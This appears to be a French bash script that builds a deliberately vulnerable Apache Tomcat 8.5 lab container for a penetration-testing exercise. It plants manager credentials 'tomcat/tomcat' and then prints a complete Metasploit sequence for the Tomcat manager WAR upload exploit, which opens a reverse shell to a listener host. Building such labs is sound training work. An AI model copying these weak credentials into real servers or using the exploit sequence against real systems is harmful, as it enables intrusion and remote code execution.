#!/bin/bash
set -e

echo "================================================"
echo "  TOMCAT 8 - INSTALLATION GARANTIE"
echo "  Exploit Metasploit ultra-fiable"
echo "================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Lance avec sudo"
    exit 1
fi

echo "[1/4] Nettoyage..."
docker stop phpmyadmin-vuln struts2-vuln webmin-vuln tomcat-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln struts2-vuln webmin-vuln tomcat-vuln 2>/dev/null || true

echo "[2/4] Installation Tomcat 8.5..."
docker pull tomcat:8.5

echo "[3/4] Configuration et lancement..."

# Cr√©er le fichier tomcat-users.xml avec credentials
mkdir -p /tmp/tomcat-conf
cat > /tmp/tomcat-conf/tomcat-users.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="tomcat" roles="manager-gui,manager-script"/>
</tomcat-users>
EOF

# Lancer Tomcat avec la config
docker run -d \
    --name tomcat-vuln \
    -p 8080:8080 \
    -v /tmp/tomcat-conf/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml \
    tomcat:8.5

echo "[4/4] V√©rification (15 secondes)..."
sleep 15

if ! docker ps | grep -q tomcat-vuln; then
    echo "‚ùå √âCHEC"
    exit 1
fi

SERVER_IP=$(hostname -I | awk '{print $1}')

echo ""
echo "================================================"
echo "  ‚úÖ TOMCAT 8 OP√âRATIONNEL !"
echo "================================================"
echo ""
docker ps | grep tomcat
echo ""
echo "üìä Configuration:"
echo "   Application: Apache Tomcat 8.5"
echo "   CVE: Tomcat Manager Upload RCE"
echo "   Port: 8080"
echo "   URL Manager: http://${SERVER_IP}:8080/manager/html"
echo "   Credentials: tomcat / tomcat"
echo ""
echo "================================================"
echo "  üî• EXPLOITATION METASPLOIT"
echo "================================================"
echo ""
echo "msfconsole -q"
echo "use exploit/multi/http/tomcat_mgr_upload"
echo "set RHOSTS ${SERVER_IP}"
echo "set RPORT 8080"
echo "set HttpUsername tomcat"
echo "set HttpPassword tomcat"
echo "set LHOST 192.168.100.10"
echo "set LPORT 4444"
echo "exploit"
echo ""
echo "================================================"
echo "  üìñ SC√âNARIO LAB"
echo "================================================"
echo ""
echo "Iron4Software utilise Tomcat pour h√©berger"
echo "des applications Java internes (portail RH,"
echo "gestion de projet, etc.)"
echo ""
echo "L'interface manager de Tomcat permet d'uploader"
echo "des fichiers WAR malveillants pour obtenir RCE."
echo ""
echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
echo ""
echo "================================================"
echo ""
